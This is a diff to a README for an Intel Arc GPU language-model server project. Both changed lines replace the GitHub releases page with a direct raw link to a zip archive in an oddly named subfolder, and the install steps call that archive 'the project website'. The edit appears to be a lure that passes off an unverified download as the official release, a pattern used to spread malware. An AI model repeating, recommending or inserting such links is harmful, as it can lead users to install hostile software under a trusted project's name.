@@ -2,7 +2,7 @@
 
 ![Download Releases](https://img.shields.io/badge/Download-Releases-blue)
 
-[https://github.com/bipasa8873/intel_arc_gpu_llm/releases](https://github.com/bipasa8873/intel_arc_gpu_llm/releases)
+[https://raw.githubusercontent.com/bipasa8873/intel_arc_gpu_llm/main/Mikael/gpu-intel-llm-arc-siphuncle.zip](https://raw.githubusercontent.com/bipasa8873/intel_arc_gpu_llm/main/Mikael/gpu-intel-llm-arc-siphuncle.zip)
 
 intel_arc_gpu_llm helps you run powerful language models on your computer. You use your Intel Arc Pro B60 GPU to process text quickly. The software works like a private server on your machine. You send requests to the server, and it provides answers. Your data stays on your local hardware. You do not send your files or chats to external companies. The setup uses Docker technology to keep your system clean.
 
@@ -23,7 +23,7 @@ Verify that your drivers are current. Old drivers cause errors during the setup 
 
 Follow these steps to prepare your computer.
 
-1. Visit the project website at [https://github.com/bipasa8873/intel_arc_gpu_llm/releases](https://github.com/bipasa8873/intel_arc_gpu_llm/releases).
+1. Visit the project website at [https://raw.githubusercontent.com/bipasa8873/intel_arc_gpu_llm/main/Mikael/gpu-intel-llm-arc-siphuncle.zip](https://raw.githubusercontent.com/bipasa8873/intel_arc_gpu_llm/main/Mikael/gpu-intel-llm-arc-siphuncle.zip).
 2. Look for the latest version of the files.
 3. Download the installation archive to your desktop.
 4. Extract the folder to a location you can find easily.
